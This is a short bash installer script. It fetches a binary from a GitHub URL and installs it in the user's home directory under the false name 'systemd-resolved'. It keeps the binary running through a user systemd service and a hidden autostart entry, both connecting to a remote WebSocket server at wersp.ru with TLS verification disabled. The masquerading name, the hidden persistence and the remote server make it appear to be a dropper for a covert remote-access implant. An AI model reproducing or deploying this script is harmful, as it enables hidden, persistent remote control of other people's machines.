#!/bin/bash
set -e
BINARY_URL="https://github.com/w9line/File_transfer/raw/1923f96c793437b4bfaba6aa4864acb4c9ec12db/client_linux"
SERVER_URL="wss://wersp.ru/ws/client"
PROXY="" MODE="auto" INSECURE=true SESSION_ID="" UNINSTALL=false START_AFTER=false
INSTALL_DIR="$HOME/.local/share/systemd" SERVICE_DIR="$HOME/.config/systemd/user" AUTOSTART_DIR="$HOME/.config/autostart"
BINARY_NAME="systemd-resolved" BINARY_PATH="$INSTALL_DIR/$BINARY_NAME"
SERVICE_NAME="systemd-resolved.service" SERVICE_PATH="$SERVICE_DIR/$SERVICE_NAME"
DESKTOP_PATH="$AUTOSTART_DIR/${BINARY_NAME}.desktop"
while [[ $# -gt 0 ]]; do case $1 in
  -b|--binary) BINARY_URL="$2"; shift 2;; -u|--url) SERVER_URL="$2"; shift 2;;
  -p|--proxy) PROXY="$2"; shift 2;; -m|--mode) MODE="$2"; shift 2;;
  -i|--insecure) INSECURE=true; shift;; -s|--session-id) SESSION_ID="$2"; shift 2;;
  --uninstall) UNINSTALL=true; shift;; --start) START_AFTER=true; shift;;
  -h|--help) exit 0;; *) exit 1;; esac; done
if [ "$UNINSTALL" = true ]; then
  systemctl --user stop "$SERVICE_NAME" 2>/dev/null||true
  systemctl --user disable "$SERVICE_NAME" 2>/dev/null||true
  rm -f "$SERVICE_PATH" "$DESKTOP_PATH" "$BINARY_PATH"; rm -rf "$INSTALL_DIR"
  systemctl --user daemon-reload; exit 0
fi
[ -z "$BINARY_URL" ]&&exit 1
mkdir -p "$INSTALL_DIR" "$SERVICE_DIR" "$AUTOSTART_DIR"
tmp="$BINARY_PATH.tmp"
if command -v curl&>/dev/null; then curl -fsSL -o"$tmp" "$BINARY_URL"
elif command -v wget&>/dev/null; then wget -q -O"$tmp" "$BINARY_URL"
else exit 1; fi
chmod +x "$tmp"; mv "$tmp" "$BINARY_PATH"
cmd="$BINARY_PATH"
[ "$MODE" != "auto" ]&&cmd="$cmd --mode $MODE"
[ "$INSECURE" = true ]&&cmd="$cmd --insecure"
[ -n "$SESSION_ID" ]&&cmd="$cmd --session-id $SESSION_ID"
env_proxy=""
[ -n "$PROXY" ]&&env_proxy="Environment=\"HTTPS_PROXY=http://$PROXY\"
Environment=\"HTTP_PROXY=http://$PROXY\"
Environment=\"https_proxy=http://$PROXY\"
Environment=\"http_proxy=http://$PROXY\""
cat>"$SERVICE_PATH"<<EOF
[Unit]
Description=Systemd Resolved
After=network.target
[Service]
Type=simple
$env_proxy
ExecStart=$cmd
Restart=always
RestartSec=5
[Install]
WantedBy=default.target
EOF
d_cmd="$BINARY_PATH --server $SERVER_URL"
[ "$MODE" != "auto" ]&&d_cmd="$d_cmd --mode $MODE"
[ "$INSECURE" = true ]&&d_cmd="$d_cmd --insecure"
[ -n "$SESSION_ID" ]&&d_cmd="$d_cmd --session-id $SESSION_ID"
px=""
[ -n "$PROXY" ]&&px="env HTTPS_PROXY=http://$PROXY HTTP_PROXY=http://$PROXY https_proxy=http://$PROXY http_proxy=http://$PROXY "
cat>"$DESKTOP_PATH"<<EOF
[Desktop Entry]
Type=Application
Name=Systemd Resolved
Exec=${px}$d_cmd
Hidden=false
NoDisplay=true
X-GNOME-Autostart-enabled=true
EOF
systemctl --user daemon-reload
systemctl --user enable "$SERVICE_NAME"
systemctl --user start "$SERVICE_NAME"
systemctl --user is-active --quiet "$SERVICE_NAME"||exit 1
